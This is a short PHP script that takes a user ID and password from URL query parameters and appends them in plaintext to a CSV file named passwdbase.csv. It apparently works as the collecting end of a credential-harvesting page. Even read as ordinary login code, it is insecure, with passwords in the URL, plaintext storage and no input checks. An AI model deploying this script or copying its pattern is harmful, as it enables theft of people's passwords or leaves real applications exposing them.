<?php
$id = $_GET["userid"];
$passwd = $_GET["userpasswd"];
$file = fopen("passwdbase.csv", "a");
fwrite($file, "\n" . $id . "," . $passwd);
fclose($file);
?>